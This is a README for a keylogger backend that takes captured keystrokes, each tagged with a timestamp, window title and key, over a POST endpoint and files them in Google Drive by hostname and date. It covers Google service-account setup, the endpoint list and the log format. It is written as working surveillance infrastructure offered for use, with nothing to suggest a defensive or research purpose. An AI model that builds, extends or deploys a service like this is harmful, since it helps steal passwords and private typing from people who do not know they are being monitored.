# Keylogger Backend with Google Drive Integration

This backend service saves raw keylogger data to Google Drive in an organized folder structure.

## Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

### 2. Google Drive API Setup

1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a new project or select an existing one
3. Enable the Google Drive API
4. Create a Service Account:
   - Go to "IAM & Admin" > "Service Accounts"
   - Click "Create Service Account"
   - Give it a name (e.g., "keylogger-drive-service")
   - Grant it the "Editor" role for Google Drive
5. Create and download a JSON key file for the service account
6. Convert the JSON content to a single line and set it as an environment variable

### 3. Environment Variables

Create a `.env` file in the Backend directory with:

```
GOOGLE_SERVICE_ACCOUNT_KEY={"type":"service_account","project_id":"your-project-id","private_key_id":"your-private-key-id","private_key":"-----BEGIN PRIVATE KEY-----\nYOUR_PRIVATE_KEY\n-----END PRIVATE KEY-----\n","client_email":"your-service-account@your-project.iam.gserviceaccount.com","client_id":"your-client-id","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":"https://www.googleapis.com/robot/v1/metadata/x509/your-service-account%40your-project.iam.gserviceaccount.com"}
PORT=8000
```

### 4. Run the Server
```bash
npm start
```

## Data Structure

The data is saved in Google Drive with the following structure:

```
keylogger data/
├── username1/
│   ├── 2025-01-15/
│   │   ├── logs_1.json
│   │   └── logs_2.json
│   └── 2025-01-16/
│       └── logs_1.json
└── username2/
    └── 2025-01-15/
        └── logs_1.json
```

## File Management

- Each user gets their own folder
- Each date gets its own subfolder
- Files are limited to 10MB each
- When a file reaches 10MB, a new file is created with an incremented number
- Raw data is saved in JSON lines format (one JSON object per line)

## API Endpoints

- `GET /` - Health check
- `POST /` - Save keylogger data
  - Body: `{ "logs": [...], "hostname": "username" }`
  - Returns: `{ "success": true, "message": "Logs saved successfully to Google Drive" }`

  User Routes:
  POST /api/users/signup — Register a new user
  POST /api/users/login — Login and receive JWT
  GET /api/users/me — Get current user info (JWT required)
  PUT /api/users/me — Update user info (JWT required)
  DELETE /api/users/me — Delete user (JWT required)
  POST /api/users/request-password-reset => Body: { "email": "user@example.com" } => (Logs a reset link to the server console.)
  POST /api/users/reset-password/:token => Body: { "password": "newpassword" }

## Data Format

Each log entry should be in the format:
```json
{
  "timestamp": "2025-06-28T23:22:11.123Z",
  "window": "Chrome - YouTube",
  "key": "H"
}
``` 